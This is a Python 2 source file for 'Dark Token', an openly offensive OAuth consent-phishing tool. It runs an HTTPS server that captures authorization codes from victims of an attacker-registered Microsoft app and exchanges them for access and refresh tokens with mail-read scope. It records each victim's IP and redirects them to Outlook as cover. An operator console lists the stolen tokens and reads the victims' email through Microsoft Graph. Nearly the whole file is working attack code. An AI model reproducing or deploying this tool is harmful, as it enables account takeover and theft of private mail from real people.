#!/usr/local/bin/python

# Dark Token 
# Written By: Mr. V (Ring0Labs)

# Dark Token, leveraging the open authentication protocol (oauth) to steal target's information. 

##########################################################################
# Dark Token                                                             #
#                                                                        #
# Copyright 2018 Viet Luu                                                #
#                                                                        #
# This file is part of www.ring0lab.com                                  #
#                                                                        #
# Dark Token is free software; you can redistribute it and/or modify     #
# it under the terms of the GNU General Public License as published by   #
# the Free Software Foundation version 3 of the License.                 #
#                                                                        #
##########################################################################

# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; 
# without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
# See the GNU General Public License for more details.

# Please don't use it for bad things!

"""
Requirements: 
valid cert.pem, key.pem. 
create an app at apps.dev.microsoft.com, platform must be web.
"""
# https://outlook.office365.com/
# https://outlook.live.com/

import BaseHTTPServer, httplib, ssl, thread
from BaseHTTPServer import BaseHTTPRequestHandler
import json
from urlparse import urlparse, parse_qs
import urllib
import os

SIGNAL = ''
global TOKENS
global HTTPD
API_BASE = 'https://graph.microsoft.com/'
API_PROFILE = 'v1.0/me'
API_MESSAGE = 'v1.0/me/messages'
global CLIENT_IP
APP_CONFIG = {
	'client_id': '',
	'scope': 'openid offline_access people.read user.read profile email mail.read',
	'client_secret': '',
	'redirect_uri': ''
	}
CERT_CONFIG = {
	'keyfile': '',
	'certfile': ''
}

help = """

[General]

start server         - To start Dark Token server.
stop server          - To stop Dark Token server.
list tokens          - To list all tokens.
list message ID      - To list email messages from a specific account.
clear                - To clear screen.

[App Configuration]

show app config      - To list app config
set client_id        - To set client_id      - REQUIRED
set scope            - To set scope
set client_secret    - To set client_secret  - REQUIRED
set redirect_uri     - To set redirect_uri   - REQUIRED

"""

rows, columns = os.popen('stty size', 'r').read().split()

class colors:
	green = '\x1b[6;30;42m'
	allwhite = '\x1b[0;37;47m'
	white = '\x1b[0;37;40m'
	blue = '\x1b[0;34;40m'
	end = '\x1b[0m'

class AuthorizationHandler(BaseHTTPRequestHandler):
	def do_GET(self):
		url_params = urlparse(self.path).query
		if url_params:
			auth_code = parse_qs(url_params)['code'][0]
			if auth_code:
				global CLIENT_IP
				CLIENT_IP = self.client_address[0]
				get_access_token(auth_code)
				# Redirect target for operation safe.
				self.send_response(307) # StatusTemporaryRedirect
				self.send_header('Location','https://outlook.live.com/')
				self.end_headers()
	def log_message(self, format, *args):
		return
	def do_POST(self):
		global HTTPD
		if self.path.startswith('/shutdown'):
			print '[!] Shutting down Dark Token Server...'	
			def stop_server(server):
				server.shutdown()
				server.server_close()
			thread.start_new_thread(stop_server, (HTTPD,))
			self.send_error(500)

def httpRequest(url, payload, access_token_authorization_bearer=None, method='POST', context=ssl._https_verify_certificates()):
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}

	if access_token_authorization_bearer:
		headers['Authorization'] = 'Bearer ' + access_token_authorization_bearer
	
	url_parsed = urlparse(url)

	conn = httplib.HTTPSConnection(url_parsed.hostname, context=context)
	conn.request(method=method, url=url_parsed.path, body=urllib.urlencode(payload), headers=headers)
	return conn.getresponse()

def get_access_token(code):
	payload = {
		'grant_type': 'authorization_code',
 		'client_id': '',
		'scope': 'openid offline_access people.read user.read profile email mail.read',
		'client_secret': '',
		'redirect_uri': '',
		'code': code
		}

	payload.update(APP_CONFIG)
	resp = httpRequest('https://login.windows.net/common/oauth2/v2.0/token', payload)
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))

	account = get_account_profile(res_json['access_token'])
	store_token(account, res_json['access_token'], res_json['id_token'], res_json['refresh_token'])

def get_account_profile(access_token):
	resp = httpRequest(API_BASE+API_PROFILE, '', access_token, 'GET')
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))

	print colors.green + '[*] Pwned: Got Access Token for ' + res_json['userPrincipalName'] + ' - ' + CLIENT_IP + colors.end
	return res_json

def get_account_messages(access_token):
	resp = httpRequest(API_BASE+API_MESSAGE, '', access_token, 'GET')
	resp_body = resp.read()
	res_json = json.loads(resp_body.decode('utf-8'))
	return res_json

def start_server():
	global HTTPD
	if not APP_CONFIG['client_id'] or not APP_CONFIG['client_secret'] or not APP_CONFIG['redirect_uri']:
		print '[!] Please check your app config.'
	else:
		try:
			HTTPD = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), AuthorizationHandler)
			print '[!] Starting Dark Token Server...'
			HTTPD.socket = ssl.wrap_socket (HTTPD.socket, keyfile='key.pem', certfile='cert.pem', server_side=True)
			HTTPD.serve_forever()
		except:
			print '[!] Server is already started.'

	
def stop_server():
	try:
		httpRequest('https://127.0.0.1/shutdown', '', context=ssl._create_unverified_context())
	except:
		pass

def store_token(account, access_token, id_token, refresh_token):
	global TOKENS
	TOKENS = []
	TOKENS.append([account, access_token, id_token, refresh_token, CLIENT_IP])

print '[!] Starting Dark Token...'

while True:
	SIGNAL = raw_input('[*]> ')
	if SIGNAL.__contains__('start server'):
		thread.start_new_thread(start_server, ())
	elif SIGNAL.__contains__('stop server'):
		stop_server()
	elif SIGNAL.__contains__('list tokens'):
		print '[!] Listing Available Tokens:'
		try:
			for i in range(len(TOKENS)):
				print colors.allwhite + '-' * int(columns) + colors.end
				print 'ID = [' + str(i) + '] - Account: ' + TOKENS[i][0]['userPrincipalName']
				print 'Access_Token: ' + TOKENS[i-1][1]
				print 'Client IP: ' + TOKENS[i-1][4]
		except NameError:
			print '[!] 0 tokens found in the database.'
			pass
	elif SIGNAL.__contains__('list message'):
		id = SIGNAL.split()[2]
		try:
			msg = get_account_messages(TOKENS[int(id)][1])
			for i in range(len(msg['value'])):
				print colors.allwhite + '-' * int(columns) + colors.end
				print colors.blue + 'Subject: ' + msg['value'][i]['subject']
				print colors.blue + 'Body:'
				print colors.white + msg['value'][i]['bodyPreview']
		except NameError:
			print '[!] 0 messages found in the database.'
			pass
	elif SIGNAL.__contains__('clear'):
		system('clear')
	elif SIGNAL.__contains__('show app config'):
		print "client_id: %s" % str(APP_CONFIG['client_id'])
		print "scope: %s" % str(APP_CONFIG['scope'])
		print "client_secret: %s" % str(APP_CONFIG['client_secret'])
		print "redirect_uri: %s" % str(APP_CONFIG['redirect_uri'])
	elif SIGNAL.__contains__('set client_id'):
		client_id = SIGNAL.split()[2]
		APP_CONFIG['client_id'] = client_id
	elif SIGNAL.__contains__('set scope'):
		scope = SIGNAL.split()[2]
		APP_CONFIG['scope'] = scope
	elif SIGNAL.__contains__('set client_secret'):
		client_secret = SIGNAL.split()[2]
		APP_CONFIG['client_secret'] = client_secret
	elif SIGNAL.__contains__('set redirect_uri'):
		redirect_uri = SIGNAL.split()[2]
		APP_CONFIG['redirect_uri'] = redirect_uri
	elif SIGNAL.__contains__('help'):
		print help
	elif not SIGNAL:
		pass
	elif SIGNAL.__contains__('exit'):
		break
	else:
		print "[!] Unknown Command. '%s' - Type help." % str(SIGNAL)